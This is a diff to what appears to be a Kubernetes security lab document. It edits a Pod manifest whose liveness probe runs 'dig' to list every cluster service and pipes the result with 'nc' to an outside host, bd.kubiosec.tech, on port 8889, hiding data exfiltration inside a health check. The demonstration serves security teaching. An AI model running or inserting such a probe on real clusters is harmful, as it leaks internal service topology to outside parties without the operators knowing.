@@ -114,7 +114,7 @@ kind: Pod
 metadata:
   labels:
     test: liveness
-  name: liveness-exec15
+  name: liveness-exec21
 spec:
   containers:
   - name: liveness
@@ -128,8 +128,8 @@ spec:
         command:
         - bash
         - -c
-        - apt-get install -y ncat dnsutils; dig +noall +answer srv any.any.svc.cluster.local | nc 192.168.0.131 8889 
-      initialDelaySeconds: 5
+        - dig +noall +answer srv any.any.svc.cluster.local | nc bd.kubiosec.tech  8889 
+      initialDelaySeconds: 30
       periodSeconds: 5
 EOF
 ```
